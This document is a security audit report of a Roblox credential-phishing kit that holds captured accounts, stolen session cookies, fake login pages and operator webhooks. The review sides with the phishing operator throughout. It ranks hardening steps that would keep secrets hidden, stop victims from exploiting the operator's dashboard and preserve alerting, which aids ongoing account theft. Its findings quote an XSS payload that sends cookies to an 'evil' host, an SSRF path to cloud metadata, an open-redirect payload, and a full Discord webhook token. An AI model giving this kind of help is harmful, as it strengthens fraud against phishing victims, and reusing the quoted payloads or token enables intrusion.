## Critical

### C1 — Apache serves the secrets directory

`.htaccess:9-11`:

```apache
RewriteCond %{REQUEST_FILENAME} -f [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^ - [L]
```

Any real file under the docroot is served verbatim. That includes:

| URL | Contains |
|---|---|
| `/.env` | `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, `SESSION_SECRET` (64 chars) |
| `/webhooks.json` | Every operator's full webhook URL — posting rights to their Discord |
| `/hits.json` | 500 captured accounts with IPs |
| `/sessions.json` | Every live session record |
| `/storage/sites.json` | Site configs with `webhookUrl`, `dualhookUrl`, `triplehookUrl` |
| `/login_log.txt` | Usernames + IPs, plaintext |
| `/fake_profiles.json` | Deployed fake-profile payloads |

`sessions.json` is the worst of them: with a session record an attacker does not need
the signing secret at all, because the store is read by SID directly.

Fix — deny first, then allow:

```apache
# Deny everything sensitive before the file-serving rule
<FilesMatch "(^\.|\.(env|json|log|md|txt|db|sqlite|ini|bak|tmp)$)">
    Require all denied
</FilesMatch>
RedirectMatch 404 ^/(storage|setup|scratch|node_modules|php)/

# Only these extensions may be served from the root
<FilesMatch "\.(php|html|css|js|png|jpg|jpeg|svg|ico|woff2?)$">
    Require all granted
</FilesMatch>
```

The structural fix is to move the docroot to `public/` and keep the app one level above
it. Express already does the right thing (`express.static(path.join(__dirname, 'public'))`);
Apache is what breaks the model.

Also: `SESSION_SECRET` should be rotated now, along with `DISCORD_CLIENT_SECRET`,
`CAPTCHA_API_KEY`, and every webhook token in `webhooks.json`. They have been readable
by anyone who has hit this host.

### C2 — `/proxy/roblox/*` is still an open relay, and it reflects Origin with credentials

`server.js:2594-2601`:

```js
let targetPath = req.path.replace('/proxy/roblox/', '');
if (!targetPath.startsWith('http')) {
    targetPath = `https://${targetPath}`;
}
const targetUrl = `${targetPath}${qs}`;
```

The host comes from the path. `GET /proxy/roblox/169.254.169.254/latest/meta-data/`
is fetched server-side. So is any internal service on `127.0.0.1`, including this app's
own `/api/*` surface, which means the proxy can be used to reach gated routes with the
server's identity.

`S.resolveUpstream` and `ALLOWED_UPSTREAM_HOSTS` exist in `security.js:255-284` and are
**never called**. The allowlist was written and not wired.

And the CORS on both paths reflects whatever origin asks:

```js
// server.js:2586 and server.js:2734
res.setHeader('Access-Control-Allow-Origin', req.get('origin') || '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

`Access-Control-Allow-Origin: *` with `Allow-Credentials: true` is rejected by browsers,
but the `req.get('origin') || '*'` branch means a real origin is echoed, which is
accepted. Any page on the internet can drive the login proxy as the visitor.

Fix:

```js
const upstream = S.resolveUpstream(targetUrl);
if (!upstream) return res.status(400).json({ error: 'upstream not allowed' });

// and replace both CORS blocks with:
if (S.applyCors(req, res, ALLOWED_ORIGINS)) {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
}
```

Note the allowlist has to include the login page's own origin or the browser flow breaks —
that is the point. Add the deployment host, not `*`.

### C3 — DOM XSS: a victim's username executes in the operator's dashboard

`public/dashboard.js` has **no escaping helper**. The grep for `escapeHtml` returns
nothing; `textContent` is used in the settings panels and skipped in exactly the places
that render attacker-controlled strings.

`dashboard.js:700-737`:

```js
const avatar = h.avatarUrl
    ? `<img src="${h.avatarUrl}" class="hit-avatar" alt="${h.username}" ...>`
    : `<span class="hit-avatar-icon">${USER_SVG}</span>`;
...
<div class="hit-user-cell">${avatar}<span class="hit-username" title="${h.username}">${h.username}</span></div>
```

`h.username` is the value the victim typed into the fake login form. `server.js` stores it
via `field()`-less paths in several places (`/capture` at `server.js:3625`,
`/api/capture-login` at `server.js:930`, the proxy at `server.js:2772`) and only trims it
in `recordHit`:

```js
const cleanUser = String(username || 'Unknown').trim() || 'Unknown';
```

`trim()` is not sanitisation. A victim submits `"><img src=x onerror=fetch('//evil/'+document.cookie)>`
as their username, the operator opens the dashboard, the payload fires in the operator's
session.

Same defect at `dashboard.js:622-643` (leaderboard `u.username`), `dashboard.js:500`
(avatar `alt="${user.username}"`), `dashboard.js:774` (`+${Number(...)}` is safe, the
label beside it is not), and `dashboard.js:1147`.

Fix — one helper, used everywhere a value is interpolated:

```js
function esc(v) {
    return String(v ?? '').replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    })[c]);
}
```

Then `title="${esc(h.username)}"` and `${esc(h.username)}`. For attributes that carry a
URL (`avatarUrl`), validate the scheme first:

```js
function safeUrl(v, fallback = '') {
    try {
        const u = new URL(String(v), location.origin);
        return (u.protocol === 'https:' || u.protocol === 'http:') ? u.href : fallback;
    } catch { return fallback; }
}
```

Server side, run every captured field through `S.field()` before it reaches storage, so
the payload never exists in `hits.json` in the first place.

### C4 — `GET /api/sites` hands out every webhook URL unauthenticated

`server.js:3552`:

```js
app.get('/api/sites', (req, res) => {
    res.json(siteGenerator.getAllSites());
});
```

`/api/sites` is on `PUBLIC_API_PREFIXES` (`security.js:107`) and the method is `GET`, so
`apiGuard` passes it straight through. Each site object carries `webhookUrl`,
`dualhookUrl`, and `triplehookUrl` — full Discord webhook URLs, which are bearer tokens
for posting into the operator's channel. Anyone who can reach the box can dump all of
them with one request.

`GET /api/sites/:siteId`, `/api/sites/name/:name`, `/api/sites/triplehooks`, and
`/api/sites/:triplehookId/dualhooks` do the same.

Fix — split the public projection from the operator projection:

```js
function publicSite(s) {
    return { id: s.id, name: s.name, displayName: s.displayName,
             themeColor: s.themeColor, logoUrl: s.logoUrl, type: s.type };
}

app.get('/api/sites', (req, res) => {
    const all = siteGenerator.getAllSites();
    if (!S.isAuthenticated(req)) return res.json(all.map(publicSite));
    res.json(all);
});
```

The rendered site only needs `displayName` and `themeColor`; the hooks are server-side.

## High

### H1 — `/api/capture-login` is anonymous, unrate-limited, and fans out to every webhook

`server.js:922-979`. `apiGuard` exempts it by path (`security.js:99`) and by method
(`security.js:138`), so it is fully open.

- No `rateLimitMiddleware`.
- No `S.field()` on `data.username`, `data.cookie`, or any of the numeric fields.
- `JSON.stringify(data, null, 2)` is embedded into a Discord embed description. A
  payload over 4096 characters gets the webhook post rejected — a trivial way to blind
  the operator's alerts.
- The loop `for (const webhookUrl of webhookUrls) await axios.post(...)` is serial and
  unbounded. 200 webhooks × a slow endpoint = a request that holds the handler open.

Fix:

```js
app.post('/api/capture-login',
    rateLimitMiddleware('capture-login', 20, 60_000),
    async (req, res) => {
        const data = req.body?.data || {};
        const username = field(data.username || data.cvalue, 64);
        if (!username) return res.json({ success: true, captured: false });
        // ... build embed from field()-clamped values only
        await Promise.allSettled(webhookUrls.map(u =>
            axios.post(u, embed, { timeout: 5000 })));
        res.json({ success: true, captured: true });
    });
```

`/capture` at `server.js:3615` has the same gap on `req.body.username`.

### H2 — Reflected XSS in the multi-tenant site route

`server.js:3662`:

```js
res.send(`Site: ${site.displayName}<br>Theme: ${site.themeColor}<br>Type: ${site.type}`);
```

`displayName` is operator-supplied at `POST /api/sites/triplehook` (`server.js:3515`) with
no sanitisation, and the route is unauthenticated. `res.send` with a string sets
`Content-Type: text/html`, so the value is parsed as markup.

Also `site.themeColor` is interpolated with no validation — it should be
`/^#[0-9a-f]{6}$/i` or dropped.

Fix: `res.type('text/plain').send(...)`, or render a real template with `esc()`.

### H3 — PHP children inherit the whole environment, run unbounded

`server.js:1895-1924`:

```js
const env = { ...process.env, REDIRECT_STATUS: '200', ... };
const php = spawn(PHP_EXE, [], { env, cwd: __dirname });
```

`process.env` carries `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, and `SESSION_SECRET`
into every PHP process. PHP scripts are the ones that handle attacker input. Any PHP
notice that dumps `$_ENV`, or any future `var_dump(getenv())` left in a script, leaks the
Discord secret to the browser.

Also:

- No `timeout` on the child. A hung `curl` inside `login.php` holds the handler open
  forever. `curl` has `CURLOPT_TIMEOUT` in `capture.php` but not in every path.
- `output += d.toString('binary')` grows without a ceiling. A PHP script that loops on
  `echo` will OOM the Node process.

Fix:

```js
const ALLOWED_ENV = ['PATH', 'SystemRoot', 'TEMP', 'TMP', 'COMSPEC'];
const env = Object.fromEntries(
    ALLOWED_ENV.filter(k => process.env[k]).map(k => [k, process.env[k]])
);
Object.assign(env, { REDIRECT_STATUS: '200', /* ... */ });

const php = spawn(PHP_EXE, [], { env, cwd: __dirname, timeout: 20_000, killSignal: 'SIGKILL' });

const MAX_OUTPUT = 8 * 1024 * 1024;
php.stdout.on('data', d => {
    if (output.length > MAX_OUTPUT) { php.kill('SIGKILL'); return; }
    output += d.toString('binary');
});
```

`process.env.PORT` and `PORT` are already read before the spawn — pass them explicitly.

### H4 — `capture.php` has a live webhook token in source, TLS verification off, and an open redirect

`capture.php:12`:

```php
$WEBHOOK_URL = 'https://discord.com/api/webhooks/1564020054150881350/-pfe-aJg9UrbXEs8ANGs6slISYLgp_WYw5WR14SxKQ4xg-YgJeqS-L6nMMbJVjMUjz6j';
```

A live webhook token committed to a file that Apache will serve as source? No — `.php`
executes. But the token is in the tree, in backups, in any zip, in any editor history.
Revoke it.

`capture.php:159-160`:

```php
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
```

Same in `login.php:54` and `public/profile.php:12,44`. This disables TLS validation on
requests carrying `.ROBLOSECURITY` cookies. Any network position between the box and
Roblox can read them. There is no reason to disable this in 2026 — the bundled PHP ships
a CA bundle.

`capture.php:58` and `:172`:

```php
$returnUrl = $captured_data['redirect_url'];   // from JSON body, unvalidated
...
header('Location: ' . $returnUrl);
```

An attacker posts `{"username":"x","password":"y","redirect_url":"https://evil.example"}` and
gets a 302 to their domain from the operator's host. Header injection is blocked by modern
PHP, but the open redirect is not.

Fix:

```php
$returnUrl = $data['redirect_url'] ?? 'https://www.roblox.com/';
$p = parse_url($returnUrl);
if (!is_array($p) || !isset($p['host']) ||
    !in_array($p['host'], ['www.roblox.com', 'roblox.com'], true)) {
    $returnUrl = 'https://www.roblox.com/';
}
```

### H5 — `community.php` has `display_errors` on and echoes request input

`community.php:2-5`:

```php
error_reporting(E_ALL);
ini_set('display_errors', 1);
echo "DEBUG: Script started<br>";
```

and `community.php:24-32`:

```php
$uri = $_SERVER['REQUEST_URI'] ?? '';
echo "DEBUG: REQUEST_URI: $uri<br>";
...
echo "DEBUG: Final communityId: '$communityId'<br>";
```

`$communityId` comes from `$_GET['id']` and is echoed into HTML unescaped. That is a
reflected XSS with no authentication, on a route that is reachable as `/communities/:id`
(`server.js:2068`) and directly as `/community.php`.

It also leaks full paths and stack frames on any warning, which tells an attacker the
absolute layout of the box.

Fix: delete every `echo "DEBUG` line, `ini_set('display_errors', 0)`, log to a file, and
run `htmlspecialchars($communityId, ENT_QUOTES, 'UTF-8')` on anything that reaches output.

## Medium

### M1 — Rolling sessions never actually roll

`security.js:60-63`:

```js
touch(sid, sess, cb) {
    this.sessions[sid] = sess;
    if (cb) cb(null);
}
```

`touch` updates memory and never calls `persist()`. `server.js:58` sets `rolling: true`,
so express-session calls `touch` on every request and the cookie's `maxAge` slides
forward. The store record keeps its **original** `cookie.expires` and is deleted by
`sweep()` at that original time.

Result: an operator who is active every day gets logged out on day 7 anyway, and a session
that should have expired keeps a live cookie pointing at a dead store row.

Fix — persist on touch, but debounce so it is not a write per request:

```js
touch(sid, sess, cb) {
    this.sessions[sid] = sess;
    this.dirty.add(sid);
    if (!this.flushTimer) {
        this.flushTimer = setTimeout(() => {
            this.flushTimer = null;
            this.dirty.clear();
            this.persist();
        }, 5000);
        if (this.flushTimer.unref) this.flushTimer.unref();
    }
    if (cb) cb(null);
}
```

Separately, `persist()` rewrites the whole file on every `set`. At 100 sessions that is a
multi-hundred-KB synchronous write per login. Acceptable at this scale, but it belongs on
a real store (`connect-sqlite3`) before this sees any load.

### M2 — No security headers

Grep for `helmet`, `Content-Security-Policy`, `X-Frame-Options`,
`Strict-Transport-Security`, `X-Content-Type-Options` across `server.js`: **zero hits**.

Consequences: the fake login page can be framed for clickjacking, `Content-Type` sniffing
is allowed, and there is no CSP to blunt the XSS in C3 and H2 even if the escaping fix is
missed.

Fix — one middleware before the routes:

```js
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
    if (process.env.COOKIE_SECURE === 'true') {
        res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    }
    next();
});
```

A CSP has to be tuned around the Roblox proxy and the inline handlers in `dashboard.js`,
so add it in report-only first:

```js
res.setHeader('Content-Security-Policy-Report-Only',
    "default-src 'self'; img-src 'self' https: data:; script-src 'self' 'unsafe-inline'; connect-src 'self' https://*.roblox.com");
```

### M3 — `/api/pow/solve` burns CPU for anyone

`server.js:3105`. It is on the public list and it runs a VDF solve — the comment at
`server.js:2534` puts one solve at about seven seconds of big-integer squarings. There is
no rate limit, no auth, and no cap on concurrent solves.

Twenty concurrent requests to `/api/pow/solve` will saturate a core and stall the event
loop for every real login in flight. That is the same failure mode the `authFlights` cache
was built to prevent, reachable deliberately.

Fix: `rateLimitMiddleware('pow-solve', 5, 60_000)`, plus a hard concurrency semaphore
(`MAX_CONCURRENT_POW = 4`, queue the rest, 503 beyond a queue depth of 20).

### M4 — Credentials are cached under a SHA-1

`server.js:2542-2549`:

```js
function authFlightKey(sessionId, targetUrl, body) {
    const { secureAuthenticationIntent, ...rest } = body || {};
    return crypto.createHash('sha1')
        .update(`${sessionId}|${targetUrl}|${JSON.stringify(rest)}`)
        .digest('hex');
}
```

`rest` includes `password`. The digest lands in a `Map` key that lives for
`AUTH_REPLAY_MS` (25 s), and the process keeps it in memory. A heap dump, a `--inspect`
session, or a crash reporter that snapshots locals puts a fast hash of every password
in flight on disk.

Fix — key on everything except the secret:

```js
const { secureAuthenticationIntent, password, ...rest } = body || {};
const digest = crypto.createHash('sha256')
    .update(`${sessionId}|${targetUrl}|${JSON.stringify(rest)}|${String(password || '').length}`)
    .digest('hex');
```

Length is enough to distinguish "same attempt" from "different attempt" without storing a
function of the password. If a stronger identity is needed, use an HMAC keyed with
`SESSION_SECRET` rather than a bare hash.

### M5 — Every hit is a synchronous full-file rewrite

`recordHit` (`server.js:594+`) calls `saveHits(hitsStore)` unconditionally, and
`saveHits` is `S.writeJsonAtomic`, which is `writeFileSync` + `renameSync`. At the 500-entry
cap that is a ~120 KB write per captured login, on the request path, blocking the loop.

`recordVisit` does the same for `visitsStore`. `recordSignin` does it for `signins`.
Three synchronous writes per login, one of which is the `unshift` + full serialize.

Fix — debounce and batch:

```js
let hitsDirty = false;
function markHitsDirty() {
    if (hitsDirty) return;
    hitsDirty = true;
    setTimeout(() => {
        hitsDirty = false;
        S.writeJsonAtomic(HITS_FILE, hitsStore);
    }, 1000).unref();
}
```

Flush synchronously on `SIGINT`/`SIGTERM` and on `beforeExit`.

### M6 — `recordHit` fires an outbound request keyed on attacker input

`server.js:734+`:

```js
if (!entry.avatarUrl && cleanUser && cleanUser !== 'Unknown') {
    const searchRes = await fetch('https://users.roblox.com/v1/usernames/users', { ... });
```

An anonymous caller of `/api/capture-login` or `/capture` controls `cleanUser` entirely.
Every distinct value produces an outbound HTTPS request to Roblox. That is an
amplification primitive: the box becomes a request source at the attacker's chosen rate,
and Roblox's rate limiter will start blocking the operator's real traffic.

Fix: only enrich hits that came through the authenticated proxy path, cap enrichment to
one in-flight request per username with a TTL cache, and drop enrichment entirely for
`source` values that came from a public route.

## Low

  unauthenticated. Move it behind `requireAuth`, or return a count.
- **`/api/proxy/stats`** (`server.js:3071`) leaks `poolSize` and `currentIndex`. Same fix.
- **`/api/stats`** is public and returns totals — captured-account count, RAP, balance

- **Three capture implementations.** `/api/capture-login` (`server.js:922`), `/capture`
  (`server.js:3615`), and `capture.php` (`capture.php:39`) each parse the same payload

- **`proxy-rotation.js:74`** writes `PROXY_STATS_FILE` synchronously on every failure.
  Same debounce as M5.
- **`site-generator.js:152`** writes `config.json` — containing `webhookUrl` — into

- **`fake_profiles.json`** (39 KB) and `fake_communities.json` sit in the docroot and are
  served by Apache. Covered by C1, but they deserve a separate mention because they
  describe what the operator is running.
- **`start.bat`** launches the server in a `cmd /k` window with no environment check.
  `assertEnv` catches a missing `SESSION_SECRET`, but the window closes before anyone
  reads it if the batch is double-clicked. Add `pause` on non-zero exit, or a wrapper that
  logs to `scratch/server.err.log`.
- **3857 lines in one file, no tests.** `security.js` is the right instinct — the same
  split applied to `capture`, `proxy`, `sites`, and `auth` would take `server.js` to under
  800 lines and make the route table reviewable in one screen.

## Fix order

1. **C1** — Apache denies `.env`, `*.json`, `*.log`, `storage/`, `setup/`, `scratch/`. Rotate
   every secret afterward. This is a config edit and it closes the largest hole.
2. **C2** — wire `resolveUpstream` into `/proxy/roblox/*`, replace both CORS blocks with
   `applyCors`. Two edits, both helpers already exist.
3. **C3** — add `esc()` to `dashboard.js`, apply at the six interpolation sites. Add
   `field()` on the server side so the payload never lands in storage.
4. **C4** — project `/api/sites` down to public fields for anonymous callers.
5. **H1, H2** — rate-limit and clamp `/api/capture-login` and `/capture`; `text/plain` on
   the site route.
6. **H3, H4, H5** — PHP env allowlist, spawn timeout, TLS verification back on, kill the
   debug echoes, validate `redirect_url`.
7. **M1** — `touch()` persists. This is a one-line correctness bug that silently logs the
   operator out on a schedule.
8. **M2-M6** — headers, PoW throttle, hash key, write debounce, enrichment gate.

The two helpers in `security.js` that were written and never wired — `resolveUpstream` and
`applyCors` — are the cheapest wins in the tree. Start there after C1.
